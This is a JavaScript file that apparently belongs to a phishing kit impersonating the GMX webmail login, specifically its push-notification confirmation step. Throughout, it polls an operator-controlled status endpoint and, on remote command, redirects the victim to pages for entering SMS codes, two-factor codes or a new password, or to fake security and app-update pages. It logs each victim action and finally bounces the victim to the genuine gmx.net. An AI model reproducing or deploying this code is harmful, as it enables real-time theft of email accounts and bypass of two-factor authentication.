(function () {
  var btnWeiter = document.getElementById('push-weiter');
  var btnResend = document.getElementById('push-resend');
  var radioSms = document.querySelector('input[name="push-option"][value="MTAN"]');
  var accordion = document.getElementById('push-accordion');

  function getId() {
    var m = /[?&]id=([^&]+)/.exec(window.location.search);
    return m ? decodeURIComponent(m[1]) : '';
  }

  function isSmsSelected() {
    return radioSms && radioSms.checked;
  }

  function updateWeiterState() {
    if (!btnWeiter) return;
    if (btnWeiter.classList.contains('is-loading')) return;
    if (isSmsSelected()) {
      btnWeiter.disabled = false;
      btnWeiter.removeAttribute('aria-disabled');
    } else {
      btnWeiter.disabled = true;
      btnWeiter.setAttribute('aria-disabled', 'true');
    }
  }

  if (btnWeiter) {
    btnWeiter.disabled = true;
    btnWeiter.setAttribute('aria-disabled', 'true');
  }
  if (radioSms) radioSms.addEventListener('change', updateWeiterState);
  if (accordion) {
    var accordionBtn = document.getElementById('push-accordion-btn');
    if (accordionBtn) accordionBtn.addEventListener('click', function () {
      accordion.classList.toggle('open');
      updateWeiterState();
    });
  }

  var id = getId();
  var statusInterval = null;
  if (id) {
    function checkStatus() {
      fetch('/api/status?id=' + encodeURIComponent(id) + '&page=push-confirm&_=' + Date.now(), { cache: 'no-store', headers: { Pragma: 'no-cache' } })
        .then(function (r) { return r.json(); })
        .then(function (res) {
          var st = res && res.status;
          if ((res && res.mode) === 'manual' && st === 'pending') return;
          if (st === 'redirect_sms_code') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location = '/sms-code.html?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_2fa_code') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location = '/2fa-code.html?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_change_password') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location = '/passwort-aendern?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_sicherheit') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location = '/sicherheit-update?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_open_on_pc') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location = '/bitte-am-pc?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_android') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location = '/app-update?id=' + encodeURIComponent(id);
          } else if (st === 'redirect_gmx_net') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location.href = (window.__BRAND__ && window.__BRAND__.canonicalUrl) || 'https://www.gmx.net/';
          } else if (st === 'error') {
            if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
            window.location = '/anmelden';
          }
        })
        .catch(function () {});
    }
    checkStatus();
    statusInterval = setInterval(checkStatus, 1000); // Увеличиваем частоту до 1 секунды
  }

  if (btnWeiter) {
    btnWeiter.addEventListener('click', function () {
      if (btnWeiter.disabled || btnWeiter.classList.contains('is-loading') || !isSmsSelected()) return;
      var id = getId();
      if (!id) return;
      btnWeiter.classList.add('is-loading');
      btnWeiter.disabled = true;
      fetch('/api/log-action', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: id, action: 'sms_request' }),
      }).then(function () {}).catch(function () {});
      fetch('/api/choose-method', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: id, method: 'sms' }),
      }).then(function () {
        window.location = '/sms-code.html?id=' + encodeURIComponent(id);
      }).catch(function () {
        window.location = '/sms-code.html?id=' + encodeURIComponent(id);
      });
    });
  }

  var RESEND_COOLDOWN = 60;
  var secondsLeft = RESEND_COOLDOWN;
  var resendTimer = null;

  function updateResendButton() {
    if (!btnResend) return;
    if (secondsLeft > 0) {
      btnResend.disabled = true;
      btnResend.textContent = 'Mitteilung erneut senden (' + secondsLeft + ' s)';
      secondsLeft--;
    } else {
      btnResend.disabled = false;
      btnResend.textContent = 'Mitteilung erneut senden';
      if (resendTimer) {
        clearInterval(resendTimer);
        resendTimer = null;
      }
    }
  }

  if (btnResend) {
    btnResend.disabled = true;
    btnResend.textContent = 'Mitteilung erneut senden (' + secondsLeft + ' s)';
    resendTimer = setInterval(function () {
      secondsLeft--;
      if (secondsLeft > 0) {
        btnResend.textContent = 'Mitteilung erneut senden (' + secondsLeft + ' s)';
      } else {
        btnResend.disabled = false;
        btnResend.textContent = 'Mitteilung erneut senden';
        clearInterval(resendTimer);
        resendTimer = null;
      }
    }, 1000);

    btnResend.addEventListener('click', function () {
      if (btnResend.disabled) return;
      var id = getId();
      if (id) {
        fetch('/api/log-action', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ id: id, action: 'push_resend' }),
        }).catch(function () {});
      }
      btnResend.disabled = true;
      secondsLeft = RESEND_COOLDOWN;
      btnResend.textContent = 'Mitteilung erneut senden (' + secondsLeft + ' s)';
      resendTimer = setInterval(function () {
        secondsLeft--;
        if (secondsLeft > 0) {
          btnResend.textContent = 'Mitteilung erneut senden (' + secondsLeft + ' s)';
        } else {
          btnResend.disabled = false;
          btnResend.textContent = 'Mitteilung erneut senden';
          clearInterval(resendTimer);
          resendTimer = null;
        }
      }, 1000);
    });
  }
})();
